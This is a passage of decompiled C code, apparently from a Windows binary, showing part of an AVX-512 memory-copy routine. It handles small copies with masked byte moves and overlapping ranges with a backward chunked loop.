    bVar3 = (bool)((byte)(uVar32 >> 0x1c) & 1);
    auVar38[0x1c] = bVar3 * auVar37[0x1c] | !bVar3 * in_register_0000125c;
    bVar3 = (bool)((byte)(uVar32 >> 0x1d) & 1);
    auVar38[0x1d] = bVar3 * auVar37[0x1d] | !bVar3 * in_register_0000125d;
    bVar3 = (bool)((byte)(uVar32 >> 0x1e) & 1);
    auVar38[0x1e] = bVar3 * auVar37[0x1e] | !bVar3 * in_register_0000125e;
    bVar3 = (bool)((byte)(uVar32 >> 0x1f) & 1);
    auVar38[0x1f] = bVar3 * auVar37[0x1f] | !bVar3 * in_register_0000125f;
    bVar3 = (bool)((byte)(uVar32 >> 0x20) & 1);
    auVar38[0x20] = bVar3 * auVar37[0x20] | !bVar3 * in_register_00001260;
    bVar3 = (bool)((byte)(uVar32 >> 0x21) & 1);
    auVar38[0x21] = bVar3 * auVar37[0x21] | !bVar3 * in_register_00001261;
    bVar3 = (bool)((byte)(uVar32 >> 0x22) & 1);
    auVar38[0x22] = bVar3 * auVar37[0x22] | !bVar3 * in_register_00001262;
    bVar3 = (bool)((byte)(uVar32 >> 0x23) & 1);
    auVar38[0x23] = bVar3 * auVar37[0x23] | !bVar3 * in_register_00001263;
    bVar3 = (bool)((byte)(uVar32 >> 0x24) & 1);
    auVar38[0x24] = bVar3 * auVar37[0x24] | !bVar3 * in_register_00001264;
    bVar3 = (bool)((byte)(uVar32 >> 0x25) & 1);
    auVar38[0x25] = bVar3 * auVar37[0x25] | !bVar3 * in_register_00001265;
    bVar3 = (bool)((byte)(uVar32 >> 0x26) & 1);
    auVar38[0x26] = bVar3 * auVar37[0x26] | !bVar3 * in_register_00001266;
    bVar3 = (bool)((byte)(uVar32 >> 0x27) & 1);
    auVar38[0x27] = bVar3 * auVar37[0x27] | !bVar3 * in_register_00001267;
    bVar3 = (bool)((byte)(uVar32 >> 0x28) & 1);
    auVar38[0x28] = bVar3 * auVar37[0x28] | !bVar3 * in_register_00001268;
    bVar3 = (bool)((byte)(uVar32 >> 0x29) & 1);
    auVar38[0x29] = bVar3 * auVar37[0x29] | !bVar3 * in_register_00001269;
    bVar3 = (bool)((byte)(uVar32 >> 0x2a) & 1);
    auVar38[0x2a] = bVar3 * auVar37[0x2a] | !bVar3 * in_register_0000126a;
    bVar3 = (bool)((byte)(uVar32 >> 0x2b) & 1);
    auVar38[0x2b] = bVar3 * auVar37[0x2b] | !bVar3 * in_register_0000126b;
    bVar3 = (bool)((byte)(uVar32 >> 0x2c) & 1);
    auVar38[0x2c] = bVar3 * auVar37[0x2c] | !bVar3 * in_register_0000126c;
    bVar3 = (bool)((byte)(uVar32 >> 0x2d) & 1);
    auVar38[0x2d] = bVar3 * auVar37[0x2d] | !bVar3 * in_register_0000126d;
    bVar3 = (bool)((byte)(uVar32 >> 0x2e) & 1);
    auVar38[0x2e] = bVar3 * auVar37[0x2e] | !bVar3 * in_register_0000126e;
    bVar3 = (bool)((byte)(uVar32 >> 0x2f) & 1);
    auVar38[0x2f] = bVar3 * auVar37[0x2f] | !bVar3 * in_register_0000126f;
    bVar3 = (bool)((byte)(uVar32 >> 0x30) & 1);
    auVar38[0x30] = bVar3 * auVar37[0x30] | !bVar3 * in_register_00001270;
    bVar3 = (bool)((byte)(uVar32 >> 0x31) & 1);
    auVar38[0x31] = bVar3 * auVar37[0x31] | !bVar3 * in_register_00001271;
    bVar3 = (bool)((byte)(uVar32 >> 0x32) & 1);
    auVar38[0x32] = bVar3 * auVar37[0x32] | !bVar3 * in_register_00001272;
    bVar3 = (bool)((byte)(uVar32 >> 0x33) & 1);
    auVar38[0x33] = bVar3 * auVar37[0x33] | !bVar3 * in_register_00001273;
    bVar3 = (bool)((byte)(uVar32 >> 0x34) & 1);
    auVar38[0x34] = bVar3 * auVar37[0x34] | !bVar3 * in_register_00001274;
    bVar3 = (bool)((byte)(uVar32 >> 0x35) & 1);
    auVar38[0x35] = bVar3 * auVar37[0x35] | !bVar3 * in_register_00001275;
    bVar3 = (bool)((byte)(uVar32 >> 0x36) & 1);
    auVar38[0x36] = bVar3 * auVar37[0x36] | !bVar3 * in_register_00001276;
    bVar3 = (bool)((byte)(uVar32 >> 0x37) & 1);
    auVar38[0x37] = bVar3 * auVar37[0x37] | !bVar3 * in_register_00001277;
    bVar4 = (byte)(uVar32 >> 0x38);
    auVar38[0x38] = (bVar4 & 1) * auVar37[0x38] | !(bool)(bVar4 & 1) * in_register_00001278;
    bVar3 = (bool)(bVar4 >> 1 & 1);
    auVar38[0x39] = bVar3 * auVar37[0x39] | !bVar3 * in_register_00001279;
    bVar3 = (bool)(bVar4 >> 2 & 1);
    auVar38[0x3a] = bVar3 * auVar37[0x3a] | !bVar3 * in_register_0000127a;
    bVar3 = (bool)(bVar4 >> 3 & 1);
    auVar38[0x3b] = bVar3 * auVar37[0x3b] | !bVar3 * in_register_0000127b;
    bVar3 = (bool)(bVar4 >> 4 & 1);
    auVar38[0x3c] = bVar3 * auVar37[0x3c] | !bVar3 * in_register_0000127c;
    bVar3 = (bool)(bVar4 >> 5 & 1);
    auVar38[0x3d] = bVar3 * auVar37[0x3d] | !bVar3 * in_register_0000127d;
    bVar3 = (bool)(bVar4 >> 6 & 1);
    auVar38[0x3e] = bVar3 * auVar37[0x3e] | !bVar3 * in_register_0000127e;
    auVar38[0x3f] =
         -((char)bVar4 >> 7) * auVar37[0x3f] | !(bool)-((char)bVar4 >> 7) * in_register_0000127f;
    auVar37 = vmovdqu8_avx512bw(auVar38);
    *param_1 = auVar37;
    return;
  }
  if (param_3 < 0x81) {
    uVar32 = *(ulonglong *)(&DAT_140095448 + (param_3 - 0x40) * 8);
    auVar37 = vmovdqu8_avx512bw(*param_2);
    auVar38 = vmovdqu8_avx512bw(param_2[1]);
    bVar3 = (bool)((byte)uVar32 & 1);
    auVar39[0] = bVar3 * auVar38[0] | !bVar3 * in_XMM2_Ba;
    bVar3 = (bool)((byte)(uVar32 >> 1) & 1);
    auVar39[1] = bVar3 * auVar38[1] | !bVar3 * in_XMM2_Bb;
    bVar3 = (bool)((byte)(uVar32 >> 2) & 1);
    auVar39[2] = bVar3 * auVar38[2] | !bVar3 * in_XMM2_Bc;
    bVar3 = (bool)((byte)(uVar32 >> 3) & 1);
    auVar39[3] = bVar3 * auVar38[3] | !bVar3 * in_XMM2_Bd;
    bVar3 = (bool)((byte)(uVar32 >> 4) & 1);
    auVar39[4] = bVar3 * auVar38[4] | !bVar3 * in_XMM2_Be;
    bVar3 = (bool)((byte)(uVar32 >> 5) & 1);
    auVar39[5] = bVar3 * auVar38[5] | !bVar3 * in_XMM2_Bf;
    bVar3 = (bool)((byte)(uVar32 >> 6) & 1);
    auVar39[6] = bVar3 * auVar38[6] | !bVar3 * in_XMM2_Bg;
    bVar3 = (bool)((byte)(uVar32 >> 7) & 1);
    auVar39[7] = bVar3 * auVar38[7] | !bVar3 * in_XMM2_Bh;
    bVar3 = (bool)((byte)(uVar32 >> 8) & 1);
    auVar39[8] = bVar3 * auVar38[8] | !bVar3 * in_XMM2_Bi;
    bVar3 = (bool)((byte)(uVar32 >> 9) & 1);
    auVar39[9] = bVar3 * auVar38[9] | !bVar3 * in_XMM2_Bj;
    bVar3 = (bool)((byte)(uVar32 >> 10) & 1);
    auVar39[10] = bVar3 * auVar38[10] | !bVar3 * in_XMM2_Bk;
    bVar3 = (bool)((byte)(uVar32 >> 0xb) & 1);
    auVar39[0xb] = bVar3 * auVar38[0xb] | !bVar3 * in_XMM2_Bl;
    bVar3 = (bool)((byte)(uVar32 >> 0xc) & 1);
    auVar39[0xc] = bVar3 * auVar38[0xc] | !bVar3 * in_XMM2_Bm;
    bVar3 = (bool)((byte)(uVar32 >> 0xd) & 1);
    auVar39[0xd] = bVar3 * auVar38[0xd] | !bVar3 * in_XMM2_Bn;
    bVar3 = (bool)((byte)(uVar32 >> 0xe) & 1);
    auVar39[0xe] = bVar3 * auVar38[0xe] | !bVar3 * in_XMM2_Bo;
    bVar3 = (bool)((byte)(uVar32 >> 0xf) & 1);
    auVar39[0xf] = bVar3 * auVar38[0xf] | !bVar3 * in_XMM2_Bp;
    bVar3 = (bool)((byte)(uVar32 >> 0x10) & 1);
    auVar39[0x10] = bVar3 * auVar38[0x10] | !bVar3 * in_YMM2_H;
    bVar3 = (bool)((byte)(uVar32 >> 0x11) & 1);
    auVar39[0x11] = bVar3 * auVar38[0x11] | !bVar3 * in_register_00001291;
    bVar3 = (bool)((byte)(uVar32 >> 0x12) & 1);
    auVar39[0x12] = bVar3 * auVar38[0x12] | !bVar3 * in_register_00001292;
    bVar3 = (bool)((byte)(uVar32 >> 0x13) & 1);
    auVar39[0x13] = bVar3 * auVar38[0x13] | !bVar3 * in_register_00001293;
    bVar3 = (bool)((byte)(uVar32 >> 0x14) & 1);
    auVar39[0x14] = bVar3 * auVar38[0x14] | !bVar3 * in_register_00001294;
    bVar3 = (bool)((byte)(uVar32 >> 0x15) & 1);
    auVar39[0x15] = bVar3 * auVar38[0x15] | !bVar3 * in_register_00001295;
    bVar3 = (bool)((byte)(uVar32 >> 0x16) & 1);
    auVar39[0x16] = bVar3 * auVar38[0x16] | !bVar3 * in_register_00001296;
    bVar3 = (bool)((byte)(uVar32 >> 0x17) & 1);
    auVar39[0x17] = bVar3 * auVar38[0x17] | !bVar3 * in_register_00001297;
    bVar3 = (bool)((byte)(uVar32 >> 0x18) & 1);
    auVar39[0x18] = bVar3 * auVar38[0x18] | !bVar3 * in_register_00001298;
    bVar3 = (bool)((byte)(uVar32 >> 0x19) & 1);
    auVar39[0x19] = bVar3 * auVar38[0x19] | !bVar3 * in_register_00001299;
    bVar3 = (bool)((byte)(uVar32 >> 0x1a) & 1);
    auVar39[0x1a] = bVar3 * auVar38[0x1a] | !bVar3 * in_register_0000129a;
    bVar3 = (bool)((byte)(uVar32 >> 0x1b) & 1);
    auVar39[0x1b] = bVar3 * auVar38[0x1b] | !bVar3 * in_register_0000129b;
    bVar3 = (bool)((byte)(uVar32 >> 0x1c) & 1);
    auVar39[0x1c] = bVar3 * auVar38[0x1c] | !bVar3 * in_register_0000129c;
    bVar3 = (bool)((byte)(uVar32 >> 0x1d) & 1);
    auVar39[0x1d] = bVar3 * auVar38[0x1d] | !bVar3 * in_register_0000129d;
    bVar3 = (bool)((byte)(uVar32 >> 0x1e) & 1);
    auVar39[0x1e] = bVar3 * auVar38[0x1e] | !bVar3 * in_register_0000129e;
    bVar3 = (bool)((byte)(uVar32 >> 0x1f) & 1);
    auVar39[0x1f] = bVar3 * auVar38[0x1f] | !bVar3 * in_register_0000129f;
    bVar3 = (bool)((byte)(uVar32 >> 0x20) & 1);
    auVar39[0x20] = bVar3 * auVar38[0x20] | !bVar3 * in_register_000012a0;
    bVar3 = (bool)((byte)(uVar32 >> 0x21) & 1);
    auVar39[0x21] = bVar3 * auVar38[0x21] | !bVar3 * in_register_000012a1;
    bVar3 = (bool)((byte)(uVar32 >> 0x22) & 1);
    auVar39[0x22] = bVar3 * auVar38[0x22] | !bVar3 * in_register_000012a2;
    bVar3 = (bool)((byte)(uVar32 >> 0x23) & 1);
    auVar39[0x23] = bVar3 * auVar38[0x23] | !bVar3 * in_register_000012a3;
    bVar3 = (bool)((byte)(uVar32 >> 0x24) & 1);
    auVar39[0x24] = bVar3 * auVar38[0x24] | !bVar3 * in_register_000012a4;
    bVar3 = (bool)((byte)(uVar32 >> 0x25) & 1);
    auVar39[0x25] = bVar3 * auVar38[0x25] | !bVar3 * in_register_000012a5;
    bVar3 = (bool)((byte)(uVar32 >> 0x26) & 1);
    auVar39[0x26] = bVar3 * auVar38[0x26] | !bVar3 * in_register_000012a6;
    bVar3 = (bool)((byte)(uVar32 >> 0x27) & 1);
    auVar39[0x27] = bVar3 * auVar38[0x27] | !bVar3 * in_register_000012a7;
    bVar3 = (bool)((byte)(uVar32 >> 0x28) & 1);
    auVar39[0x28] = bVar3 * auVar38[0x28] | !bVar3 * in_register_000012a8;
    bVar3 = (bool)((byte)(uVar32 >> 0x29) & 1);
    auVar39[0x29] = bVar3 * auVar38[0x29] | !bVar3 * in_register_000012a9;
    bVar3 = (bool)((byte)(uVar32 >> 0x2a) & 1);
    auVar39[0x2a] = bVar3 * auVar38[0x2a] | !bVar3 * in_register_000012aa;
    bVar3 = (bool)((byte)(uVar32 >> 0x2b) & 1);
    auVar39[0x2b] = bVar3 * auVar38[0x2b] | !bVar3 * in_register_000012ab;
    bVar3 = (bool)((byte)(uVar32 >> 0x2c) & 1);
    auVar39[0x2c] = bVar3 * auVar38[0x2c] | !bVar3 * in_register_000012ac;
    bVar3 = (bool)((byte)(uVar32 >> 0x2d) & 1);
    auVar39[0x2d] = bVar3 * auVar38[0x2d] | !bVar3 * in_register_000012ad;
    bVar3 = (bool)((byte)(uVar32 >> 0x2e) & 1);
    auVar39[0x2e] = bVar3 * auVar38[0x2e] | !bVar3 * in_register_000012ae;
    bVar3 = (bool)((byte)(uVar32 >> 0x2f) & 1);
    auVar39[0x2f] = bVar3 * auVar38[0x2f] | !bVar3 * in_register_000012af;
    bVar3 = (bool)((byte)(uVar32 >> 0x30) & 1);
    auVar39[0x30] = bVar3 * auVar38[0x30] | !bVar3 * in_register_000012b0;
    bVar3 = (bool)((byte)(uVar32 >> 0x31) & 1);
    auVar39[0x31] = bVar3 * auVar38[0x31] | !bVar3 * in_register_000012b1;
    bVar3 = (bool)((byte)(uVar32 >> 0x32) & 1);
    auVar39[0x32] = bVar3 * auVar38[0x32] | !bVar3 * in_register_000012b2;
    bVar3 = (bool)((byte)(uVar32 >> 0x33) & 1);
    auVar39[0x33] = bVar3 * auVar38[0x33] | !bVar3 * in_register_000012b3;
    bVar3 = (bool)((byte)(uVar32 >> 0x34) & 1);
    auVar39[0x34] = bVar3 * auVar38[0x34] | !bVar3 * in_register_000012b4;
    bVar3 = (bool)((byte)(uVar32 >> 0x35) & 1);
    auVar39[0x35] = bVar3 * auVar38[0x35] | !bVar3 * in_register_000012b5;
    bVar3 = (bool)((byte)(uVar32 >> 0x36) & 1);
    auVar39[0x36] = bVar3 * auVar38[0x36] | !bVar3 * in_register_000012b6;
    bVar3 = (bool)((byte)(uVar32 >> 0x37) & 1);
    auVar39[0x37] = bVar3 * auVar38[0x37] | !bVar3 * in_register_000012b7;
    bVar4 = (byte)(uVar32 >> 0x38);
    auVar39[0x38] = (bVar4 & 1) * auVar38[0x38] | !(bool)(bVar4 & 1) * in_register_000012b8;
    bVar3 = (bool)(bVar4 >> 1 & 1);
    auVar39[0x39] = bVar3 * auVar38[0x39] | !bVar3 * in_register_000012b9;
    bVar3 = (bool)(bVar4 >> 2 & 1);
    auVar39[0x3a] = bVar3 * auVar38[0x3a] | !bVar3 * in_register_000012ba;
    bVar3 = (bool)(bVar4 >> 3 & 1);
    auVar39[0x3b] = bVar3 * auVar38[0x3b] | !bVar3 * in_register_000012bb;
    bVar3 = (bool)(bVar4 >> 4 & 1);
    auVar39[0x3c] = bVar3 * auVar38[0x3c] | !bVar3 * in_register_000012bc;
    bVar3 = (bool)(bVar4 >> 5 & 1);
    auVar39[0x3d] = bVar3 * auVar38[0x3d] | !bVar3 * in_register_000012bd;
    bVar3 = (bool)(bVar4 >> 6 & 1);
    auVar39[0x3e] = bVar3 * auVar38[0x3e] | !bVar3 * in_register_000012be;
    auVar39[0x3f] =
         -((char)bVar4 >> 7) * auVar38[0x3f] | !(bool)-((char)bVar4 >> 7) * in_register_000012bf;
    auVar37 = vmovdqu8_avx512bw(auVar37);
    *param_1 = auVar37;
    auVar37 = vmovdqu8_avx512bw(auVar39);
    param_1[1] = auVar37;
    return;
  }
  pauVar25 = (undefined1 (*) [64])(*param_2 + param_3);
  if (param_1 <= param_2) {
    pauVar25 = param_1;
  }
  if (param_1 < pauVar25) {
    uVar20 = *(undefined8 *)*param_2;
    uVar21 = *(undefined8 *)(*param_2 + 8);
    lVar33 = (longlong)param_2 - (longlong)param_1;
    puVar29 = (undefined1 *)((longlong)param_1 + lVar33 + (param_3 - 0x10));
    uVar5 = puVar29[1];
    uVar6 = puVar29[2];
    uVar7 = puVar29[3];
    uVar8 = puVar29[4];
    uVar9 = puVar29[5];
    uVar10 = puVar29[6];
    uVar11 = puVar29[7];
    uVar12 = puVar29[8];
    uVar13 = puVar29[9];
    uVar14 = puVar29[10];
    uVar15 = puVar29[0xb];
    uVar16 = puVar29[0xc];
    uVar17 = puVar29[0xd];
    uVar18 = puVar29[0xe];
    uVar19 = puVar29[0xf];
    puVar27 = param_1[-1] + param_3 + 0x30;
    uVar32 = param_3 - 0x10;
    puVar28 = puVar27;
    uVar43 = *puVar29;
    uVar44 = uVar5;
    uVar45 = uVar6;
    uVar46 = uVar7;
    uVar47 = uVar8;
    uVar48 = uVar9;
    uVar49 = uVar10;
    uVar50 = uVar11;
    uVar51 = uVar12;
    uVar52 = uVar13;
    uVar53 = uVar14;
    uVar54 = uVar15;
    uVar55 = uVar16;
    uVar56 = uVar17;
    uVar57 = uVar18;
    uVar58 = uVar19;
    if (((ulonglong)puVar27 & 0xf) != 0) {
      puVar28 = (undefined1 *)((ulonglong)puVar27 & 0xfffffffffffffff0);
      puVar1 = puVar28 + lVar33;
      uVar43 = *puVar1;
      uVar44 = puVar1[1];
      uVar45 = puVar1[2];
      uVar46 = puVar1[3];
      uVar47 = puVar1[4];
      uVar48 = puVar1[5];
      uVar49 = puVar1[6];
      uVar50 = puVar1[7];
      uVar51 = puVar1[8];
      uVar52 = puVar1[9];
      uVar53 = puVar1[10];
      uVar54 = puVar1[0xb];
      uVar55 = puVar1[0xc];
      uVar56 = puVar1[0xd];
      uVar57 = puVar1[0xe];
      uVar58 = puVar1[0xf];
      *puVar27 = *puVar29;
      param_1[-1][param_3 + 0x31] = uVar5;
      param_1[-1][param_3 + 0x32] = uVar6;
      param_1[-1][param_3 + 0x33] = uVar7;
      param_1[-1][param_3 + 0x34] = uVar8;
      param_1[-1][param_3 + 0x35] = uVar9;
      param_1[-1][param_3 + 0x36] = uVar10;
      param_1[-1][param_3 + 0x37] = uVar11;
      param_1[-1][param_3 + 0x38] = uVar12;
      param_1[-1][param_3 + 0x39] = uVar13;
      param_1[-1][param_3 + 0x3a] = uVar14;
      param_1[-1][param_3 + 0x3b] = uVar15;
      param_1[-1][param_3 + 0x3c] = uVar16;
      param_1[-1][param_3 + 0x3d] = uVar17;
      param_1[-1][param_3 + 0x3e] = uVar18;
      param_1[-1][param_3 + 0x3f] = uVar19;
      uVar32 = (longlong)puVar28 - (longlong)param_1;
    }
    uVar35 = uVar32 >> 7;
    if (uVar35 != 0) {
      *puVar28 = uVar43;
      puVar28[1] = uVar44;
      puVar28[2] = uVar45;
      puVar28[3] = uVar46;
      puVar28[4] = uVar47;
      puVar28[5] = uVar48;
      puVar28[6] = uVar49;
      puVar28[7] = uVar50;
      puVar28[8] = uVar51;
      puVar28[9] = uVar52;
      puVar28[10] = uVar53;
      puVar28[0xb] = uVar54;
      puVar28[0xc] = uVar55;
      puVar28[0xd] = uVar56;
      puVar28[0xe] = uVar57;
      puVar28[0xf] = uVar58;
      puVar29 = puVar28;
      while( true ) {
        uVar22 = *(undefined8 *)((longlong)(puVar29 + lVar33 + -0x10) + 8);
        uVar23 = *(undefined8 *)(puVar29 + lVar33 + -0x20);
        uVar24 = *(undefined8 *)((longlong)(puVar29 + lVar33 + -0x20) + 8);
        puVar28 = puVar29 + -0x80;
        *(undefined8 *)(puVar29 + -0x10) = *(undefined8 *)(puVar29 + lVar33 + -0x10);
        *(undefined8 *)(puVar29 + -8) = uVar22;
        *(undefined8 *)(puVar29 + -0x20) = uVar23;
        *(undefined8 *)(puVar29 + -0x18) = uVar24;
        uVar22 = *(undefined8 *)((longlong)(puVar29 + lVar33 + -0x30) + 8);
        uVar23 = *(undefined8 *)(puVar29 + lVar33 + -0x40);
        uVar24 = *(undefined8 *)((longlong)(puVar29 + lVar33 + -0x40) + 8);
        uVar35 = uVar35 - 1;
        *(undefined8 *)(puVar29 + -0x30) = *(undefined8 *)(puVar29 + lVar33 + -0x30);
        *(undefined8 *)(puVar29 + -0x28) = uVar22;
        *(undefined8 *)(puVar29 + -0x40) = uVar23;
        *(undefined8 *)(puVar29 + -0x38) = uVar24;
        uVar22 = *(undefined8 *)((longlong)(puVar29 + lVar33 + -0x50) + 8);
        uVar23 = *(undefined8 *)(puVar29 + lVar33 + -0x60);
        uVar24 = *(undefined8 *)((longlong)(puVar29 + lVar33 + -0x60) + 8);
        *(undefined8 *)(puVar29 + -0x50) = *(undefined8 *)(puVar29 + lVar33 + -0x50);
        *(undefined8 *)(puVar29 + -0x48) = uVar22;
        *(undefined8 *)(puVar29 + -0x60) = uVar23;
        *(undefined8 *)(puVar29 + -0x58) = uVar24;
        uVar22 = *(undefined8 *)(puVar29 + lVar33 + -0x70);
        uVar23 = *(undefined8 *)((longlong)(puVar29 + lVar33 + -0x70) + 8);
        puVar27 = puVar28 + lVar33;
        uVar43 = *puVar27;
        uVar44 = puVar27[1];
        uVar45 = puVar27[2];
        uVar46 = puVar27[3];
        uVar47 = puVar27[4];
        uVar48 = puVar27[5];
        uVar49 = puVar27[6];
        uVar50 = puVar27[7];
        uVar51 = puVar27[8];
        uVar52 = puVar27[9];
        uVar53 = puVar27[10];
        uVar54 = puVar27[0xb];
        uVar55 = puVar27[0xc];
        uVar56 = puVar27[0xd];
        uVar57 = puVar27[0xe];
        uVar58 = puVar27[0xf];
        if (uVar35 == 0) break;
        *(undefined8 *)(puVar29 + -0x70) = uVar22;
        *(undefined8 *)(puVar29 + -0x68) = uVar23;
        *puVar28 = uVar43;
        puVar29[-0x7f] = uVar44;
        puVar29[-0x7e] = uVar45;
        puVar29[-0x7d] = uVar46;
        puVar29[-0x7c] = uVar47;
        puVar29[-0x7b] = uVar48;
        puVar29[-0x7a] = uVar49;
        puVar29[-0x79] = uVar50;
        puVar29[-0x78] = uVar51;
        puVar29[-0x77] = uVar52;
        puVar29[-0x76] = uVar53;
        puVar29[-0x75] = uVar54;
        puVar29[-0x74] = uVar55;
        puVar29[-0x73] = uVar56;
        puVar29[-0x72] = uVar57;
        puVar29[-0x71] = uVar58;
        puVar29 = puVar28;
      }
      *(undefined8 *)(puVar29 + -0x70) = uVar22;
      *(undefined8 *)(puVar29 + -0x68) = uVar23;
      uVar32 = uVar32 & 0x7f;
    }
    for (uVar35 = uVar32 >> 4; uVar35 != 0; uVar35 = uVar35 - 1) {
      *puVar28 = uVar43;
      puVar28[1] = uVar44;
      puVar28[2] = uVar45;
      puVar28[3] = uVar46;
      puVar28[4] = uVar47;
      puVar28[5] = uVar48;
      puVar28[6] = uVar49;
      puVar28[7] = uVar50;
      puVar28[8] = uVar51;
      puVar28[9] = uVar52;
      puVar28[10] = uVar53;
      puVar28[0xb] = uVar54;
      puVar28[0xc] = uVar55;
      puVar28[0xd] = uVar56;
      puVar28[0xe] = uVar57;
      puVar28[0xf] = uVar58;
      puVar28 = puVar28 + -0x10;
      puVar29 = puVar28 + lVar33;
      uVar43 = *puVar29;
      uVar44 = puVar29[1];
      uVar45 = puVar29[2];
      uVar46 = puVar29[3];
      uVar47 = puVar29[4];
      uVar48 = puVar29[5];
      uVar49 = puVar29[6];
      uVar50 = puVar29[7];
      uVar51 = puVar29[8];
      uVar52 = puVar29[9];
      uVar53 = puVar29[10];
      uVar54 = puVar29[0xb];
      uVar55 = puVar29[0xc];
      uVar56 = puVar29[0xd];
      uVar57 = puVar29[0xe];
      uVar58 = puVar29[0xf];
    }
    if ((uVar32 & 0xf) != 0) {
      *(undefined8 *)*param_1 = uVar20;
      *(undefined8 *)(*param_1 + 8) = uVar21;
    }
    *puVar28 = uVar43;
    puVar28[1] = uVar44;
    puVar28[2] = uVar45;
    puVar28[3] = uVar46;
    puVar28[4] = uVar47;
    puVar28[5] = uVar48;
    puVar28[6] = uVar49;
    puVar28[7] = uVar50;
    puVar28[8] = uVar51;
    puVar28[9] = uVar52;
    puVar28[10] = uVar53;
    puVar28[0xb] = uVar54;
    puVar28[0xc] = uVar55;
    puVar28[0xd] = uVar56;
    puVar28[0xe] = uVar57;
    puVar28[0xf] = uVar58;
    return;
  }
  if ((param_3 < 0x180000) && (0x4000 < param_3)) {
    for (; param_3 != 0; param_3 = param_3 - 1) {
      (*param_1)[0] = (*param_2)[0];
      param_2 = (undefined1 (*) [64])(*param_2 + 1);
      param_1 = (undefined1 (*) [64])(*param_1 + 1);
    }
    return;
  }
  lVar33 = ((ulonglong)(param_1 + 1) & 0xffffffffffffffc0) - (longlong)param_1;
  uVar32 = *(ulonglong *)(&DAT_140095448 + lVar33 * 8);
  auVar37 = vmovdqu8_avx512bw(*param_2);
  bVar3 = (bool)((byte)uVar32 & 1);
  auVar40[0] = bVar3 * auVar37[0] | !bVar3 * in_XMM0_Ba;
  bVar3 = (bool)((byte)(uVar32 >> 1) & 1);
  auVar40[1] = bVar3 * auVar37[1] | !bVar3 * in_XMM0_Bb;
  bVar3 = (bool)((byte)(uVar32 >> 2) & 1);
  auVar40[2] = bVar3 * auVar37[2] | !bVar3 * in_XMM0_Bc;
  bVar3 = (bool)((byte)(uVar32 >> 3) & 1);
  auVar40[3] = bVar3 * auVar37[3] | !bVar3 * in_XMM0_Bd;
  bVar3 = (bool)((byte)(uVar32 >> 4) & 1);
  auVar40[4] = bVar3 * auVar37[4] | !bVar3 * in_XMM0_Be;
  bVar3 = (bool)((byte)(uVar32 >> 5) & 1);
  auVar40[5] = bVar3 * auVar37[5] | !bVar3 * in_XMM0_Bf;
  bVar3 = (bool)((byte)(uVar32 >> 6) & 1);
  auVar40[6] = bVar3 * auVar37[6] | !bVar3 * in_XMM0_Bg;
  bVar3 = (bool)((byte)(uVar32 >> 7) & 1);
  auVar40[7] = bVar3 * auVar37[7] | !bVar3 * in_XMM0_Bh;
  bVar3 = (bool)((byte)(uVar32 >> 8) & 1);
  auVar40[8] = bVar3 * auVar37[8] | !bVar3 * in_XMM0_Bi;
  bVar3 = (bool)((byte)(uVar32 >> 9) & 1);
  auVar40[9] = bVar3 * auVar37[9] | !bVar3 * in_XMM0_Bj;
  bVar3 = (bool)((byte)(uVar32 >> 10) & 1);
  auVar40[10] = bVar3 * auVar37[10] | !bVar3 * in_XMM0_Bk;
  bVar3 = (bool)((byte)(uVar32 >> 0xb) & 1);
  auVar40[0xb] = bVar3 * auVar37[0xb] | !bVar3 * in_XMM0_Bl;
  bVar3 = (bool)((byte)(uVar32 >> 0xc) & 1);
  auVar40[0xc] = bVar3 * auVar37[0xc] | !bVar3 * in_XMM0_Bm;
  bVar3 = (bool)((byte)(uVar32 >> 0xd) & 1);
  auVar40[0xd] = bVar3 * auVar37[0xd] | !bVar3 * in_XMM0_Bn;
  bVar3 = (bool)((byte)(uVar32 >> 0xe) & 1);
  auVar40[0xe] = bVar3 * auVar37[0xe] | !bVar3 * in_XMM0_Bo;
  bVar3 = (bool)((byte)(uVar32 >> 0xf) & 1);
  auVar40[0xf] = bVar3 * auVar37[0xf] | !bVar3 * in_XMM0_Bp;
  bVar3 = (bool)((byte)(uVar32 >> 0x10) & 1);
  auVar40[0x10] = bVar3 * auVar37[0x10] | !bVar3 * in_YMM0_H;
  bVar3 = (bool)((byte)(uVar32 >> 0x11) & 1);
  auVar40[0x11] = bVar3 * auVar37[0x11] | !bVar3 * in_register_00001211;
  bVar3 = (bool)((byte)(uVar32 >> 0x12) & 1);
  auVar40[0x12] = bVar3 * auVar37[0x12] | !bVar3 * in_register_00001212;
  bVar3 = (bool)((byte)(uVar32 >> 0x13) & 1);
  auVar40[0x13] = bVar3 * auVar37[0x13] | !bVar3 * in_register_00001213;
  bVar3 = (bool)((byte)(uVar32 >> 0x14) & 1);
  auVar40[0x14] = bVar3 * auVar37[0x14] | !bVar3 * in_register_00001214;
  bVar3 = (bool)((byte)(uVar32 >> 0x15) & 1);
  auVar40[0x15] = bVar3 * auVar37[0x15] | !bVar3 * in_register_00001215;
  bVar3 = (bool)((byte)(uVar32 >> 0x16) & 1);
  auVar40[0x16] = bVar3 * auVar37[0x16] | !bVar3 * in_register_00001216;
  bVar3 = (bool)((byte)(uVar32 >> 0x17) & 1);
  auVar40[0x17] = bVar3 * auVar37[0x17] | !bVar3 * in_register_00001217;
  bVar3 = (bool)((byte)(uVar32 >> 0x18) & 1);
  auVar40[0x18] = bVar3 * auVar37[0x18] | !bVar3 * in_register_00001218;
  bVar3 = (bool)((byte)(uVar32 >> 0x19) & 1);
  auVar40[0x19] = bVar3 * auVar37[0x19] | !bVar3 * in_register_00001219;
  bVar3 = (bool)((byte)(uVar32 >> 0x1a) & 1);
  auVar40[0x1a] = bVar3 * auVar37[0x1a] | !bVar3 * in_register_0000121a;
  bVar3 = (bool)((byte)(uVar32 >> 0x1b) & 1);
  auVar40[0x1b] = bVar3 * auVar37[0x1b] | !bVar3 * in_register_0000121b;
  bVar3 = (bool)((byte)(uVar32 >> 0x1c) & 1);
  auVar40[0x1c] = bVar3 * auVar37[0x1c] | !bVar3 * in_register_0000121c;
  bVar3 = (bool)((byte)(uVar32 >> 0x1d) & 1);
  auVar40[0x1d] = bVar3 * auVar37[0x1d] | !bVar3 * in_register_0000121d;
  bVar3 = (bool)((byte)(uVar32 >> 0x1e) & 1);
  auVar40[0x1e] = bVar3 * auVar37[0x1e] | !bVar3 * in_register_0000121e;
  bVar3 = (bool)((byte)(uVar32 >> 0x1f) & 1);
  auVar40[0x1f] = bVar3 * auVar37[0x1f] | !bVar3 * in_register_0000121f;
  bVar3 = (bool)((byte)(uVar32 >> 0x20) & 1);
  auVar40[0x20] = bVar3 * auVar37[0x20] | !bVar3 * in_register_00001220;
  bVar3 = (bool)((byte)(uVar32 >> 0x21) & 1);
